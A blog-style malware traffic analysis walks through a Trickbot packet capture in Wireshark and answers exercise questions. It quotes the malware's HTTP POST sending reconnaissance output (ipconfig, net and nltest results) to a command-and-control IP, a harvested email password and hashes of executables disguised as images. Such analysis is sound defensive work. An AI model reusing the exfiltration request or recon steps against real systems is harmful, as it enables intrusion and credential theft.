---
title: Analysis of network capture [CATBOMBER]
layout: home
author: seKret
permalink: catbomber.html
---
In this post im going to analyse a .pcap, this network capture have malware traffic.
You can download the sample im going to analyse in https://www.malware-traffic-analysis.net/2020/05/28/.
The questions i have to answer are the following:

1. Based on the Trickbot infection's HTTP POST traffic, what is the IP address, host name, and user account name for the infected Windows client?

2. What is the other user account name and other Windows client host name found in the Trickbot HTTP POST traffic?

3. What is the infected user's email password?

4. Two Windows executable files are sent in the network traffic.  What are the SHA256 file hashes for these files?

The first thing i do its open the sample with wireshark:
![](https://i.imgur.com/8EIg93G.png)

The first questions says "Based on the Trickbot infection's HTTP POST traffic, what is the IP address, host name, and user account name for the infected Windows client?", the question give us valuable information like how the malware comunicate back with the attacker, using http protocol, lets put a filter in wireshark to view only http traffic.
![](https://i.imgur.com/sCvUtJi.png)
Im going to put here the request and response of each http comunicattion.
The first is this (packet 20 and 22):
![](https://i.imgur.com/V293wQ5.png)
Its a GET Request using curl (we know this thanks to the useragent) to api.ipify.org, the response its a public ip address, i suppose this public ip its the organization public IP.
The next couple of packets are the following:
![](https://i.imgur.com/T2FKN1g.png)
Its doing a POST request to a webserver with the ip address `36.89.106.69`, the interesting here its URI what are requesting for `/yas33/CAT-BOMB-W7-PC_W617601.1071BE9788304FBD0C52B1EE36701166/83/`, `yass33`, `CAT-BOMB-W7-PC_W617601.1071BE9788304FBD0C52B1EE36701166`, `83` a code, this code can be random or not, we dont know it yet.
The next couple of packet are the following:
![](https://i.imgur.com/q8Mezje.png)
This looks more interesting, its sending to the same webserver email passwords `pop3://mail.catbomber.net:995|phillip.ghent|gh3ntf@st`. If you look the URI has changed a little bit, the code is not the same now its 81.
The following packets are:
![](https://i.imgur.com/vDVYBTj.png)
In this request looks like the malware its harvesting "OpenVPN password and configs" and didnt find nothing, this is the reason why the data section its empty, if you look at the code in the URI you can see its `81`, looks like all the passwords can harvest the malware its send to that code in the webserver.
The following packets are this:
![](https://i.imgur.com/pk58YXm.png)
Its look same the as the previous, but this time its trying to get OpenSSH private keys, its sending the information to the the code `81`.
At this point we can ensure that the in the URI its not random.
The next packets are the following:
```
POST /yas33/CAT-BOMB-W7-PC_W617601.1071BE9788304FBD0C52B1EE36701166/90 HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary7MA4YWxkTrZu0gW
User-Agent: Winhttp 1/0
Content-Length: 4362
Host: 203.176.135.102:8082

-----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="proclist"

		----------------PROCESS LIST----------------

[System Process]
System
smss.exe
csrss.exe
wininit.exe
csrss.exe
winlogon.exe
services.exe
lsass.exe
lsm.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
spoolsv.exe
svchost.exe
svchost.exe
svchost.exe
taskhost.exe
dwm.exe
explorer.exe
SearchIndexer.exe
WUDFHost.exe
wermgr.exe
svchost.exe


proclisttest
-----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="sysinfo"

		----------------SYSTEM_INFO----------------

	ipconfig /all


Windows IP Configuration

   Host Name . . . . . . . . . . . . : Cat-Bomb-W7-PC
   Primary Dns Suffix  . . . . . . . : catbomber.net
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : catbomber.net
                                       localdomain

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : localdomain
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-08-02-1C-47-AE
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.5.28.229(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Thursday, May 28, 2020 9:50:47 AM
   Lease Expires . . . . . . . . . . : Friday, June 05, 2020 9:50:47 AM
   Default Gateway . . . . . . . . . : 10.5.28.1
   DHCP Server . . . . . . . . . . . : 10.5.28.8
   DNS Servers . . . . . . . . . . . : 10.5.28.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes


	net config workstation

Computer name                        \\CAT-BOMB-W7-PC
Full Computer name                   Cat-Bomb-W7-PC.catbomber.net
User name                            phillip.ghent

Workstation active on                
	NetBT_Tcpip_{AD1371BC-0945-813B-7C48-EA36C6F104A3} (0008021C47AE)

Software version                     Windows 7 Professional

Workstation domain                   CATBOMBER
Workstation Domain DNS Name          catbomber.net
Logon domain                         CATBOMBER

COM Open Timeout (sec)               0
COM Send Count (byte)                16
COM Send Timeout (msec)              250
The command completed successfully.



	net view /all

System error 6118 has occurred.

The list of servers for this workgroup is not currently available



	net view /all /domain

System error 6118 has occurred.

The list of servers for this workgroup is not currently available



	nltest /domain_trusts

List of domain trusts:
    0: CATBOMBER catbomber.net (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully


	nltest /domain_trusts /all_trusts

List of domain trusts:
    0: CATBOMBER catbomber.net (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully


		-----------------LOCAL_MACHINE_DATA-----------------

User_Name: CN=Phillip Ghent,CN=Users,DC=catbomber,DC=net
Computer_Name: CN=CAT-BOMB-W7-PC,CN=Computers,DC=catbomber,DC=net
Site_Name: Default-First-Site-Name
Domain_Shortname: CATBOMBER
Domain_Name: catbomber.net
Forest_Name: catbomber.net
Domain_Controller: Catbomber-DC.catbomber.net
Forest_Trees:
	1) catbomber.net


Username: Administrator Username: Guest Username: krbtgt Username: timothy.sizemore Username: phillip.ghent 

Domain: Catbomber-DC.catbomber.net

Name: Catbomber-DC.catbomber.net
Name: CAT-BOMB-W10-PC.catbomber.net
Name: CAT-BOMB-W7-PC.catbomber.net


Username: Administrator Username: Guest Username: krbtgt Username: timothy.sizemore Username: phillip.ghent ------------------------------------------------


-----WebKitFormBoundary7MA4YWxkTrZu0gW--
```
```
HTTP/1.1 200 OK
server: Cowboy
date: Thu, 28 May 2020 18:09:20 GMT
content-length: 3
Content-Type: text/plain

/1/
```
The malware its sending to the attacker all the information can harvest about the target. With this information at this point we can answer some questions. See answers in answers section. 

We can answer the three first questions, now we must find the executables the malware is sending to the infected machine. 
Knowing that the malware exchanges information via HTTP i look into all the requests finding this executable and i found to 2 request to 2 .png images, this couple of resquests looks suspicious.
![](https://i.imgur.com/OIoKu6W.png)
If i follow the request to imgpaper.png we view the webserver its replying it with a executable. We know its a executable because its starting with a MZ, all the PE Executables starts with a MZ at the beggining.
![](https://i.imgur.com/uahbyoC.png)
If i follow the request of cursor.png its the same thing.
![](https://i.imgur.com/nZxhUSh.png)
I export this 2 objects and i calculate the checksum of each one. See at answers section.


# Answers
1. Based on the Trickbot infection's HTTP POST traffic, what is the IP address, host name, and user account name for the infected Windows client?
Infected IP Address = 10.5.28.229
Hostname = Cat-Bomb-W7-PC
Username = phillip.ghent

2. What is the other user account name and other Windows client host name found in the Trickbot HTTP POST traffic?
Username = timothy.sizemore
Hostname = CAT-BOMB-W10-PC

3. What is the infected user’s email password?
Username = phillip.ghent
Password = gh3ntf@st

4. Two Windows executable files are sent in the network traffic. What are the SHA256 file hashes for these files?
imagepaper.png = `934c84524389ecfb3b1dfcb28f9697a2b52ea0ebcaa510469f0d2d9086bcc79a`
cursor.png = `4e76d73f3b303e481036ada80c2eeba8db2f306cbc9323748560843c80b2fed1`